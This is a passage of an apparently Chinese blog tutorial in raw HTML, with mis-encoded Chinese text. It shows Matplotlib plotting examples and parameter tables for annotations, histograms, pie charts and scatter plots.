number">1</span><span class="token punctuation">,</span><span class="token string">'(5,1)'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span>  <span class="token comment"># åœ¨(5,1)å¤„æ·»åŠ æ–‡æœ¬ä¿¡æ¯</span>plt<span class="token punctuation">.</span>annotate<span class="token punctuation">(</span><span class="token string">'çœ‹è¿™é‡Œ'</span><span class="token punctuation">,</span>xy<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>xytext<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1.5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               arrowprops<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'facecolor'</span><span class="token punctuation">:</span><span class="token string">'k'</span><span class="token punctuation">,</span><span class="token string">'shrink'</span><span class="token punctuation">:</span><span class="token number">0.1</span><span class="token punctuation">,</span><span class="token string">'width'</span><span class="token punctuation">:</span><span class="token number">1.5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment"># è®¾ç½®æŒ‡ç¤ºç®­å¤´</span>plt<span class="token punctuation">.</span>ylim<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># è®¾ç½®yè½´ä¸Šä¸‹é™</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'b-.'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># æ˜¾ç¤ºç½‘æ ¼</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br><img src="https://img-blog.csdnimg.cn/20200306112151427.png#pic_center =500x400" style="zoom:50%;" /></p><h1 id="5-å¸¸ç”¨å›¾è¡¨ç»˜åˆ¶"><a href="#5-å¸¸ç”¨å›¾è¡¨ç»˜åˆ¶" class="headerlink" title="5. å¸¸ç”¨å›¾è¡¨ç»˜åˆ¶"></a>5. å¸¸ç”¨å›¾è¡¨ç»˜åˆ¶</h1><p>å‰æ–‡å·²ç»è¯´æ˜äº†ä¸€èˆ¬çš„æ›²çº¿å›¾ç»˜åˆ¶ï¼Œæœ¬ç« è®²è¿°å…¶ä»–å‡ ç§å¸¸ç”¨çš„å›¾è¡¨ç»˜åˆ¶æ–¹æ³•ï¼Œæ¯ä¸ªå›¾è¡¨éƒ½å°†å…ˆç»™ä¸€ä¸ªç®€å•çš„ç»˜å›¾æ ·ä¾‹ï¼ˆç”¨äºå¿«é€ŸæŸ¥è¯¢ç»˜åˆ¶ï¼‰ï¼Œå†è¯¦ç»†è®²è§£å‡½æ•°å‚æ•°ä¿¡æ¯å¹¶ç»™å‡ºæ›´ä¸ºä¸°å¯Œçš„ç»˜åˆ¶æ–¹æ³•ä¸æ•ˆæœã€‚</p><h2 id="5-1-ç›´æ–¹å›¾"><a href="#5-1-ç›´æ–¹å›¾" class="headerlink" title="5.1 ç›´æ–¹å›¾"></a>5.1 ç›´æ–¹å›¾</h2><blockquote><p><strong>é€‚ç”¨æ•°å€¼å¯¹æ¯”</strong>  </p></blockquote><h3 id="5-1-1-ç®€å•æ ·ä¾‹"><a href="#5-1-1-ç®€å•æ ·ä¾‹" class="headerlink" title="5.1.1 ç®€å•æ ·ä¾‹"></a>5.1.1 ç®€å•æ ·ä¾‹</h3><ul><li><strong>æ•ˆæœ</strong><br>  <img src="https://img-blog.csdnimg.cn/20200306112151427.png#pic_center =500x400" style="zoom:50%;" /></li><li><strong>ä»£ç </strong>     <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span>  bins <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>  <span class="token comment"># è®¾ç½®ç›´æ–¹å›¾åˆ†å¸ƒåŒºé—´[0-50],10ä¸ºé—´è·</span>plt<span class="token punctuation">.</span>hist<span class="token punctuation">(</span>x<span class="token punctuation">,</span>bins<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">"darkgreen"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'å­¦ç”Ÿæˆç»©åˆ†å¸ƒå›¾'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'æˆç»©'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'äººæ•°'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlim<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span>  <span class="token comment"># è®¾ç½®xè½´åŒºé—´èŒƒå›´ï¼Œç©ºå‡ºä¸€äº›</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="5-1-2-å‡½æ•°å®šä¹‰"><a href="#5-1-2-å‡½æ•°å®šä¹‰" class="headerlink" title="5.1.2 å‡½æ•°å®šä¹‰"></a>5.1.2 å‡½æ•°å®šä¹‰</h3><code>Matplotlib</code>ä¸­ç»˜åˆ¶ç›´æ–¹å›¾çš„å‡½æ•°æ˜¯<code>plt.hist()</code>,è¯¦ç»†å®šä¹‰å¦‚ä¸‹ï¼š</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">hist</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> bins<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">range</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> density<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> weights<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> cumulative<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> bottom<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> histtype<span class="token operator">=</span><span class="token string">'bar'</span><span class="token punctuation">,</span> align<span class="token operator">=</span><span class="token string">'mid'</span><span class="token punctuation">,</span> orientation<span class="token operator">=</span><span class="token string">'vertical'</span><span class="token punctuation">,</span> rwidth<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> log<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> stacked<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">[</span>source<span class="token punctuation">]</span>Â¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><div class="table-container"><table><thead><tr><th style="text-align:center">å‚æ•°(åŠ ç²—ä¸ºå¸¸ç”¨å‚æ•°)</th><th style="text-align:center">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:center"><strong>x</strong></td><td style="text-align:center">è¾“å…¥æ•°æ®ï¼Œæ¥å—æ•°ç»„æˆ–åˆ—è¡¨</td></tr><tr><td style="text-align:center"><strong>bins</strong></td><td style="text-align:center">åŒºé—´åˆ†å¸ƒè®¾ç½®(è®¾å®šä¸€ä¸ªæ€»åŒºé—´å’ŒåŒºé—´é•¿åº¦)</td></tr><tr><td style="text-align:center">range</td><td style="text-align:center"><code>bins</code>çš„ä¸Šä¸‹é™ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®é»˜è®¤ä¸º<code>x.min(),x.max()</code></td></tr><tr><td style="text-align:center">density</td><td style="text-align:center">æ˜¾ç¤ºç»Ÿè®¡é¢‘ç‡ï¼Œé»˜è®¤ä¸ºFalseï¼Œä¸ºTrueåˆ™yè½´æ˜¾ç¤ºé¢‘ç‡</td></tr><tr><td style="text-align:center">histtype</td><td style="text-align:center">ç›´æ–¹å›¾ç±»å‹ï¼Œå¯é€‰<code>bar</code>(é»˜è®¤),<code>barstacked</code>,<code>step</code>(æ¢¯çŠ¶),<code>stepfilled</code>å››ç§</td></tr><tr><td style="text-align:center">align</td><td style="text-align:center">æ§åˆ¶ç›´æ–¹å›¾æ°´å¹³åˆ†å¸ƒï¼Œå¯é€‰<code>left</code>,<code>mid</code>(é»˜è®¤),<code>right</code></td></tr></tbody></table></div><blockquote><p>å…¶ä»–å‚æ•°åŸºæœ¬ç”¨ä¸åˆ°ï¼Œåœ¨éœ€è¦çš„æ—¶å€™å¯æŸ¥é˜…<a href="https://matplotlib.org/api/_as_gen/matplotlib.pyplot.hist.html?highlight=hist#matplotlib.pyplot.hist">å®˜æ–¹æ–‡æ¡£</a> </p></blockquote><h3 id="5-1-3-æ­£æ€åˆ†å¸ƒç›´æ–¹å›¾"><a href="#5-1-3-æ­£æ€åˆ†å¸ƒç›´æ–¹å›¾" class="headerlink" title="5.1.3 æ­£æ€åˆ†å¸ƒç›´æ–¹å›¾"></a>5.1.3 æ­£æ€åˆ†å¸ƒç›´æ–¹å›¾</h3><ul><li><strong>æ•ˆæœ</strong><br>  <img src="https://img-blog.csdnimg.cn/20200306112240985.png#pic_center =500x400" style="zoom:50%;" /></li><li><strong>ä»£ç </strong>     <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment"># Fixing random state for reproducibility</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">20200306</span><span class="token punctuation">)</span>mu<span class="token punctuation">,</span> sigma <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">20</span>  <span class="token comment"># å‡å€¼å’Œæ–¹å·®</span>x <span class="token operator">=</span> mu <span class="token operator">+</span> sigma <span class="token operator">*</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token comment"># the histogram of the data</span>plt<span class="token punctuation">.</span>hist<span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> density<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> facecolor<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.75</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'Smarts'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Probability'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'Histogram of IQ'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">.023</span><span class="token punctuation">,</span> <span class="token string">r'$\mu=50,\ \sigma=20$'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlim<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylim<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0.03</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li></ul><h2 id="5-2-é¥¼çŠ¶å›¾"><a href="#5-2-é¥¼çŠ¶å›¾" class="headerlink" title="5.2 é¥¼çŠ¶å›¾"></a>5.2 é¥¼çŠ¶å›¾</h2><blockquote><p><strong>é€‚ç”¨æ¯”ä¾‹åŒºåˆ†</strong>  </p></blockquote><h3 id="5-2-1-ç®€å•æ ·ä¾‹"><a href="#5-2-1-ç®€å•æ ·ä¾‹" class="headerlink" title="5.2.1 ç®€å•æ ·ä¾‹"></a>5.2.1 ç®€å•æ ·ä¾‹</h3><ul><li><p><strong>æ•ˆæœ</strong><br>  <img src="https://img-blog.csdnimg.cn/20200306112301635.png#pic_center =500x400" style="zoom:50%;" /></p></li><li><p><strong>ä»£ç </strong></p>  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltplt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span> labels <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'è¯­æ–‡'</span><span class="token punctuation">,</span><span class="token string">'æ•°å­¦'</span><span class="token punctuation">,</span><span class="token string">'è‹±è¯­'</span><span class="token punctuation">,</span><span class="token string">'ç‰©ç†'</span><span class="token punctuation">)</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">]</span>  <span class="token comment"># æŒ‰100æ¯”ä¾‹åˆ†é…</span>explode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">,</span><span class="token number">0.1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># è·ç¦»ä¸­å¿ƒè·ç¦»</span>plt<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>x<span class="token punctuation">,</span>explode<span class="token operator">=</span>explode<span class="token punctuation">,</span>labels<span class="token operator">=</span>labels<span class="token punctuation">,</span>autopct<span class="token operator">=</span><span class="token string">'%.2f'</span><span class="token punctuation">,</span>shadow <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> startangle<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li></ul><h3 id="5-2-2-å‡½æ•°å®šä¹‰"><a href="#5-2-2-å‡½æ•°å®šä¹‰" class="headerlink" title="5.2.2 å‡½æ•°å®šä¹‰"></a>5.2.2 å‡½æ•°å®šä¹‰</h3><p><code>Matplotlib</code>ä¸­ç»˜åˆ¶é¥¼å›¾çš„å‡½æ•°æ˜¯<code>plt.pie()</code>ï¼Œå®Œæ•´çš„å‡½æ•°å®šä¹‰å’Œå‚æ•°å¦‚ä¸‹ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pie</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> explode<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> labels<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> colors<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> autopct<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>pctdistance<span class="token operator">=</span><span class="token number">0.6</span><span class="token punctuation">,</span> shadow<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> labeldistance<span class="token operator">=</span><span class="token number">1.1</span><span class="token punctuation">,</span> startangle<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>radius<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> counterclock<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> wedgeprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> textprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>center<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> frame<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> rotatelabels<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> hold<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></p><div class="table-container"><table><thead><tr><th>å‚æ•°(åŠ ç²—ä¸ºå¸¸ç”¨å‚æ•°)</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><strong>x</strong></td><td>(æ¯ä¸€å—)çš„æ¯”ä¾‹ï¼Œå¦‚æœsum(x) &gt; 1ä¼šä½¿ç”¨sum(x)å½’ä¸€åŒ–</td></tr><tr><td><strong>explode</strong></td><td>(æ¯ä¸€å—)ç¦»å¼€ä¸­å¿ƒè·ç¦»</td></tr><tr><td><strong>labels</strong></td><td>(æ¯ä¸€å—)é¥¼å›¾å¤–ä¾§æ˜¾ç¤ºçš„è¯´æ˜æ–‡å­—</td></tr><tr><td>colors</td><td>è‡ªå®šä¹‰é¢œè‰²ï¼Œåˆ—è¡¨ï¼Œå¦‚[â€˜redâ€™,â€™yellowâ€™]</td></tr><tr><td><strong>autopct</strong></td><td>æ§åˆ¶é¥¼å›¾å†…ç™¾åˆ†æ¯”è®¾ç½®,å¯ä»¥ä½¿ç”¨formatå­—ç¬¦ä¸²æˆ–è€…format function</td></tr><tr><td>pctdistance</td><td>ç±»ä¼¼äºlabeldistance,æŒ‡å®šautopctçš„ä½ç½®åˆ»åº¦,é»˜è®¤å€¼ä¸º0.6</td></tr><tr><td>shadow</td><td>åœ¨é¥¼å›¾ä¸‹é¢ç”»ä¸€ä¸ªé˜´å½±ã€‚é»˜è®¤å€¼ï¼šFalseï¼Œå³ä¸ç”»é˜´å½±</td></tr><tr><td>labeldistance</td><td>labelæ ‡è®°çš„ç»˜åˆ¶ä½ç½®,ç›¸å¯¹äºåŠå¾„çš„æ¯”ä¾‹ï¼Œé»˜è®¤å€¼ä¸º1.1, å¦‚&lt;1åˆ™ç»˜åˆ¶åœ¨é¥¼å›¾å†…ä¾§</td></tr><tr><td><strong>startangle</strong></td><td>èµ·å§‹ç»˜åˆ¶è§’åº¦,é»˜è®¤å›¾æ˜¯ä»xè½´æ­£æ–¹å‘é€†æ—¶é’ˆç”»èµ·,å¦‚è®¾å®š=90åˆ™ä»yè½´æ­£æ–¹å‘ç”»èµ·</td></tr><tr><td>radius</td><td>æ§åˆ¶é¥¼å›¾åŠå¾„ï¼Œé»˜è®¤å€¼ä¸º1</td></tr><tr><td>counterclock</td><td>æŒ‡å®šæŒ‡é’ˆæ–¹å‘ï¼›å¸ƒå°”å€¼ï¼Œå¯é€‰å‚æ•°ï¼Œé»˜è®¤ä¸ºï¼šTrueï¼Œå³é€†æ—¶é’ˆã€‚å°†å€¼æ”¹ä¸ºFalseå³å¯æ”¹ä¸ºé¡ºæ—¶é’ˆ</td></tr><tr><td>wedgeprops</td><td>å­—å…¸ç±»å‹ï¼Œå¯é€‰å‚æ•°ï¼Œé»˜è®¤å€¼ï¼šNoneã€‚å‚æ•°å­—å…¸ä¼ é€’ç»™wedgeå¯¹è±¡ç”¨æ¥ç”»ä¸€ä¸ªé¥¼å›¾ã€‚ä¾‹å¦‚ï¼šwedgeprops={â€˜linewidthâ€™:3}ï¼Œè®¾ç½®wedgeçº¿å®½ä¸º3</td></tr><tr><td>textprops</td><td>è®¾ç½®æ ‡ç­¾ï¼ˆlabelsï¼‰å’Œæ¯”ä¾‹æ–‡å­—çš„æ ¼å¼ï¼›å­—å…¸ç±»å‹ï¼Œå¯é€‰å‚æ•°ï¼Œé»˜è®¤å€¼ä¸ºï¼šNoneã€‚ä¼ é€’ç»™textå¯¹è±¡çš„å­—å…¸å‚æ•°ã€‚</td></tr><tr><td>center</td><td>æµ®ç‚¹ç±»å‹çš„åˆ—è¡¨ï¼Œå¯é€‰å‚æ•°ï¼Œé»˜è®¤å€¼ï¼š(0,0)ã€‚å›¾æ ‡ä¸­å¿ƒä½ç½®</td></tr><tr><td>frame</td><td>å¸ƒå°”ç±»å‹ï¼Œå¯é€‰å‚æ•°ï¼Œé»˜è®¤å€¼ï¼šFalseã€‚å¦‚æœæ˜¯trueï¼Œç»˜åˆ¶å¸¦æœ‰è¡¨çš„è½´æ¡†æ¶ã€‚</td></tr><tr><td>rotatelabels</td><td>å¸ƒå°”ç±»å‹ï¼Œå¯é€‰å‚æ•°ï¼Œé»˜è®¤ä¸ºï¼šFalseã€‚å¦‚æœä¸ºTrueï¼Œæ—‹è½¬æ¯ä¸ªlabelåˆ°æŒ‡å®šçš„è§’åº¦</td></tr></tbody></table></div><h3 id="5-2-3-æ·»åŠ å›¾ä¾‹"><a href="#5-2-3-æ·»åŠ å›¾ä¾‹" class="headerlink" title="5.2.3 æ·»åŠ å›¾ä¾‹"></a>5.2.3 æ·»åŠ å›¾ä¾‹</h3><ul><li><strong>æ•ˆæœ</strong><br>  <img src="https://img-blog.csdnimg.cn/20200306112334659.png#pic_center =500x400" style="zoom:50%;" /></li><li><p><strong>ä»£ç </strong>   </p>  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltplt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span> labels <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'è¯­æ–‡'</span><span class="token punctuation">,</span><span class="token string">'æ•°å­¦'</span><span class="token punctuation">,</span><span class="token string">'è‹±è¯­'</span><span class="token punctuation">,</span><span class="token string">'ç‰©ç†'</span><span class="token punctuation">)</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">]</span>  <span class="token comment"># æŒ‰100æ¯”ä¾‹åˆ†é…</span>explode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">,</span><span class="token number">0.1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># è·ç¦»ä¸­å¿ƒè·ç¦»</span>plt<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>x<span class="token punctuation">,</span>explode<span class="token operator">=</span>explode<span class="token punctuation">,</span>labels<span class="token operator">=</span>labels<span class="token punctuation">,</span>autopct<span class="token operator">=</span><span class="token string">'%.2f%%'</span><span class="token punctuation">,</span>  <span class="token comment"># æ·»åŠ äº†ç™¾åˆ†å·</span>shadow <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> startangle<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>axis<span class="token punctuation">(</span><span class="token string">'equal'</span><span class="token punctuation">)</span>  <span class="token comment"># æ‘†æ­£</span>plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"upper right"</span><span class="token punctuation">,</span> fontsize <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">,</span> bbox_to_anchor<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1.1</span><span class="token punctuation">,</span><span class="token number">1.2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>borderaxespad<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span>  <span class="token comment"># loc :  'upper right' ä½äºå³ä¸Šè§’</span><span class="token comment"># bbox_to_anchor: ä¸Šè¾¹è·</span><span class="token comment"># borderaxespad: å›¾ä¾‹çš„å†…è¾¹è·</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li></ul><blockquote><p>è¿™é‡Œä»…ç»™å‡ºäº†å¸¸ç”¨é¥¼å›¾ç»˜åˆ¶æ³•ï¼Œæ›´å¤šè¯¦ç»†å†…å®¹å‚è€ƒ<a href="https://www.cnblogs.com/biyoulin/p/9565350.html">matplotlib çŸ¥è¯†ç‚¹11ï¼šç»˜åˆ¶é¥¼å›¾ï¼ˆpie å‡½æ•°ç²¾è®²ï¼‰</a>  </p></blockquote><h2 id="5-3-æ•£ç‚¹å›¾"><a href="#5-3-æ•£ç‚¹å›¾" class="headerlink" title="5.3 æ•£ç‚¹å›¾"></a>5.3 æ•£ç‚¹å›¾</h2><blockquote><p><strong>é€‚ç”¨æ•°æ®ç‚¹åˆ†å¸ƒ</strong>  </p></blockquote><p>åœ¨å¯¹å¤§é‡æ•°æ®è¿›è¡Œåˆ†ç±»çš„æ—¶å€™é‡‡ç”¨æ•£ç‚¹å›¾çš„æ–¹å¼èƒ½å¤Ÿè®©æˆ‘ä»¬ç›´è§‚åœ°æ„Ÿå—åˆ°æœ‰å‡ ç§ç±»å‹ã€‚ </p><p>æ•£ç‚¹å›¾æœ¬èº«ä¹Ÿæ˜¯æ•°æ®ç‚¹çš„é›†åˆï¼Œå› æ­¤å¯ä»¥é‡‡ç”¨<code>plot</code>å‡½æ•°æˆ–<code>plt.scatter</code>å®ç°</p><h3 id="5-3-1-ç®€å•æ ·ä¾‹"><a href="#5-3-1-ç®€å•æ ·ä¾‹" class="headerlink" title="5.3.1 ç®€å•æ ·ä¾‹"></a>5.3.1 ç®€å•æ ·ä¾‹</h3><blockquote><p><strong>plotå®ç°</strong></p></blockquote><ul><li><strong>æ•ˆæœ</strong><br><img src="https://img-blog.csdnimg.cn/20200306112406269.png#pic_center =500x400" style="zoom:50%;" /></li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npplt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'Scatter'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 